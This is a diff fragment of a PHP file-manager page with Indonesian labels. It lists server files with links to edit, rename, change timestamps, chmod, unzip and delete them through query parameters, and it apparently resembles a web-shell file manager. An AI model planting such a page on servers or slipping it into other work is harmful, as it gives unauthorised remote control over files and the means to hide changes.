+        <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($folder) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta semua isinya?\")'><i class='fa fa-trash' aria-hidden='true'></i></a>
       </td>
     </tr>
 ";
+    }
+    
+    // Tampilkan files
+    foreach ($files as $file) {
+        $perms = "0" . substr(decoct(fileperms(PATH . "/" . $file)), -3);
+        $color_class = getPermsColorClass($perms, PATH . "/" . $file);
+        $ext = strtolower(fileExtension($file));
+        
+        $actions = '
+        <a title="Edit File" href="?q=' . urlencode(encodePath(PATH)) . '&e=' . urlencode($file) . '"><i class="fa-solid fa-file-pen"></i></a>
+        <a title="Rename" href="?q=' . urlencode(encodePath(PATH)) . '&r=' . urlencode($file) . '"><i class="fa-sharp fa-regular fa-pen-to-square"></i></a>
+        <a title="Ubah Tanggal" href="?q=' . urlencode(encodePath(PATH)) . '&t=' . urlencode($file) . '"><i class="fa-regular fa-calendar"></i></a>
+        <a title="Chmod" href="?q=' . urlencode(encodePath(PATH)) . '&chmod=' . urlencode($file) . '"><i class="fa-solid fa-key"></i></a>';
+        
+        if ($ext == 'zip') {
+            $actions .= '<a title="Unzip" href="?q=' . urlencode(encodePath(PATH)) . '&u=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin mengunzip file ini?\')"><i class="fa-regular fa-file-zipper" style="color: #a207ff;"></i></a>';
         }
-        foreach ($files as $file) {
-            $perms = "0" . substr(decoct(fileperms(PATH . "/" . $file)), -3);
-            $color_class = getPermsColorClass($perms);
-            $file_url = PATH . "/" . $file;
-            $ext = strtolower(fileExtension($file));
-            
-            // Actions untuk semua file
-            $actions = '
-            <a title="Edit File" href="?q=' . urlencode(encodePath(PATH)) . '&e=' . urlencode($file) . '"><i class="fa-solid fa-file-pen"></i></a>
-            <a title="Rename" href="?q=' . urlencode(encodePath(PATH)) . '&r=' . urlencode($file) . '"><i class="fa-sharp fa-regular fa-pen-to-square"></i></a>
-            <a title="Ubah Tanggal" href="?q=' . urlencode(encodePath(PATH)) . '&t=' . urlencode($file) . '"><i class="fa-regular fa-calendar"></i></a>';
-            
-            // Tambah icon unzip untuk file zip
-            if ($ext == 'zip') {
-                $actions .= '<a title="Unzip" href="?q=' . urlencode(encodePath(PATH)) . '&u=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin mengunzip file ini?\')"><i class="fa-regular fa-file-zipper" style="color: #a207ff;"></i></a>';
-            }
-            
-            // Tambah icon delete
-            $actions .= '<a title="Delete" href="?q=' . urlencode(encodePath(PATH)) . '&d=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin menghapus file ini?\')"><i class="fa fa-trash" aria-hidden="true"></i></a>';
-            
-            echo "    <tr>
+        
+        $actions .= '<a title="Delete" href="?q=' . urlencode(encodePath(PATH)) . '&d=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin menghapus file ini?\')"><i class="fa fa-trash" aria-hidden="true"></i></a>';
+        
+        echo "    <tr>
           <td>" . fileIcon($file) . "<a href='?q=" . urlencode(encodePath(PATH)) . "&e=" . urlencode($file) . "' class='file-name-link'>" . $file . "</a></td>
           <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
           <td>" . date("F d Y H:i:s", filemtime(PATH . "/" . $file)) . "</td>
@@ -1387,18 +1497,18 @@ color: #ffc107;
           <td>" . $actions . "</td>
     </tr>
 ";
-        }
-        echo "  </tbody>
-</table>";
-        echo '</div>'; // Close main-container
-    } else {
-        if (empty($_GET)) {
-            echo ("<script>window.location.replace('?p=');</script>");
-        }
     }
-    ?>
+    echo "  </tbody>
+</table>";
+    echo '</div>';
+} else {
+    if (empty($_GET)) {
+        echo ("<script>window.location.replace('?p=');</script>");
+    }
+}
+?>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
 </body>
 
 </html>
